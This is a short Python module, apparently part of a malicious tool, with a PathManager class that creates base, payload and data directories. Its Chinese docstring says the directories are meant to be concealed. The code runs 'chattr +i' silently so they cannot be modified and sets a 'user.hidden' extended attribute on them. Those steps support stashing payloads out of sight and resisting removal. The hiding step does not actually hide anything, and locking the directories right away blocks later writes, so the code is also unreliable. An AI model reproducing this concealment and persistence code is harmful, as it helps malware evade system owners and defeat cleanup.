import os
from .settings import settings

class PathManager:
    @staticmethod
    def init():
        """创建隐蔽目录并设置不可变属性"""
        dirs = [settings.BASE_DIR, settings.PAYLOAD_DIR, settings.DATA_DIR]
        for d in dirs:
            os.makedirs(d, exist_ok=True)
            os.system(f'chattr +i {d} >/dev/null 2>&1')  # 防篡改
            os.system(f'setfattr -n user.hidden -v 1 {d}')

paths = PathManager()